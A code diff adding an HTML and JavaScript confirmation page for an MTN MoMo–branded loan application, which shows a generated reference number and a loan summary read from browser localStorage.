@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo - Confirmation</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+        
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .logo-mtn {
+            color: #FFC100;
+        }
+        
+        .logo-momo {
+            color: #0047AB;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+            text-align: center;
+        }
+        
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px auto;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            transition: width 0.5s ease;
+        }
+        
+        .step-text {
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .success-icon {
+            font-size: 72px;
+            margin: 10px 0 15px;
+            animation: bounceIn 0.6s ease;
+        }
+        
+        @keyframes bounceIn {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.2); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .confirmation-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+        
+        .confirmation-title .highlight {
+            color: #0047AB;
+        }
+        
+        .confirmation-subtitle {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .reference-box {
+            background: #f8f9ff;
+            border-radius: 14px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 2px dashed #0047AB;
+        }
+        
+        .reference-label {
+            font-size: 12px;
+            color: #777;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .reference-number {
+            font-size: 20px;
+            font-weight: 800;
+            color: #0047AB;
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+        
+        .summary-box {
+            background: #f8f9ff;
+            border-radius: 14px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .summary-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 14px;
+            border-bottom: 1px solid #e8ecf5;
+        }
+        
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+        
+        .summary-row .label {
+            color: #777;
+        }
+        
+        .summary-row .value {
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+        
+        .summary-row .value.highlight {
+            color: #0047AB;
+        }
+        
+        .status-box {
+            background: #e8f5e9;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #c8e6c9;
+        }
+        
+        .status-box .status-icon {
+            font-size: 28px;
+            display: block;
+        }
+        
+        .status-box .status-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e7e34;
+        }
+        
+        .status-box .status-sub {
+            font-size: 12px;
+            color: #555;
+            margin-top: 2px;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 10px;
+        }
+        
+        .home-btn {
+            flex: 1;
+            padding: 14px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .home-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.35);
+        }
+        
+        .home-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .track-btn {
+            flex: 1;
+            padding: 14px;
+            background: #f0f0f0;
+            color: #555;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+        
+        .track-btn:hover {
+            background: #e0e0e0;
+            transform: scale(1.02);
+        }
+        
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+        
+        footer a {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        /* Scrollbar styling */
+        .card::-webkit-scrollbar {
+            width: 4px;
+        }
+        
+        .card::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        
+        .card::-webkit-scrollbar-thumb {
+            background: #0047AB;
+            border-radius: 10px;
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px 16px;
+            }
+            .confirmation-title {
+                font-size: 20px;
+            }
+            .success-icon {
+                font-size: 56px;
+            }
+            .reference-number {
+                font-size: 17px;
+            }
+            .btn-group {
+                flex-direction: column;
+            }
+            .home-btn,
+            .track-btn {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go home">←</button>
+        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
+        <div></div>
+    </header>
+    
+    <main class="card">
+        <!-- Progress -->
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Step 3 of 3 • Complete ✅</div>
+
+        <!-- Success Icon -->
+        <div class="success-icon">✅</div>
+        
+        <h1 class="confirmation-title">Application <span class="highlight">Submitted!</span></h1>
+        <p class="confirmation-subtitle">Your loan application has been received and is being processed.</p>
+
+        <!-- Reference Number -->
+        <div class="reference-box">
+            <div class="reference-label">📋 Reference Number</div>
+            <div class="reference-number" id="referenceNumber">MTN-2026-XXXX</div>
+        </div>
+
+        <!-- Status -->
+        <div class="status-box">
+            <span class="status-icon">⏳</span>
+            <div class="status-text">Pending Admin Approval</div>
+            <div class="status-sub">You will receive an SMS notification once approved.</div>
+        </div>
+
+        <!-- Loan Summary -->
+        <div class="summary-box">
+            <div class="summary-title">📊 Loan Summary</div>
+            <div class="summary-row">
+                <span class="label">Loan Type</span>
+                <span class="value" id="summaryType">Personal Loan</span>
+            </div>
+            <div class="summary-row">
+                <span class="label">Loan Amount</span>
+                <span class="value highlight" id="summaryAmount">ZMW 5,000</span>
+            </div>
+            <div class="summary-row">
+                <span class="label">Loan Term</span>
+                <span class="value" id="summaryTerm">12 Months</span>
+            </div>
+            <div class="summary-row">
+                <span class="label">Applicant</span>
+                <span class="value" id="summaryName">John Banda</span>
+            </div>
+            <div class="summary-row">
+                <span class="label">Phone</span>
+                <span class="value" id="summaryPhone">+260 971234567</span>
+            </div>
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-group">
+            <button class="home-btn" onclick="window.location.href='index.html'">🏠 HOME</button>
+            <button class="track-btn" onclick="alert('Tracking feature coming soon!')">📊 TRACK</button>
+        </div>
+    </main>
+    
+    <footer>
+        © 2026 MTN MoMo Zambia • 
+        <a href="#" onclick="alert('Call 155 for support')">Help</a> • 
+        <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
+    </footer>
+
+    <script>
+        // ============================================
+        // GENERATE REFERENCE NUMBER
+        // ============================================
+        function generateReference() {
+            const year = new Date().getFullYear();
+            const random = Math.floor(1000 + Math.random() * 9000);
+            return `MTN-${year}-${random}`;
+        }
+
+        // ============================================
+        // LOAD DATA FROM LOCALSTORAGE
+        // ============================================
+        function loadSummary() {
+            const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
+            
+            document.getElementById('summaryType').textContent = loanData.loanType || 'Personal Loan';
+            document.getElementById('summaryAmount').textContent = 'ZMW ' + parseInt(loanData.loanAmount || '5000').toLocaleString();
+            document.getElementById('summaryTerm').textContent = (loanData.loanTerm || '12') + ' Months';
+            document.getElementById('summaryName').textContent = loanData.fullName || 'Not provided';
+            document.getElementById('summaryPhone').textContent = '+260 ' + (loanData.phone || 'Not provided');
+            
+            // Generate and display reference number
+            const ref = generateReference();
+            document.getElementById('referenceNumber').textContent = ref;
+            
+            // Save reference
+            localStorage.setItem('referenceNumber', ref);
+        }
+
+        loadSummary();
+
+        // ============================================
+        // LOG DATA
+        // ============================================
+        console.log('====================================');
+        console.log('✅ MTN MoMo - Confirmation Page');
+        console.log('====================================');
+        console.log('📋 Reference:', localStorage.getItem('referenceNumber'));
+        console.log('📱 Loan Data:', JSON.parse(localStorage.getItem('loanData') || '{}'));
+        console.log('====================================');
+
+        // ============================================
+        // PREVENT BACK NAVIGATION TO FORM
+        // ============================================
+        window.addEventListener('popstate', function(e) {
+            window.location.href = 'index.html';
+        });
+    </script>
+</body>
+
+</html>
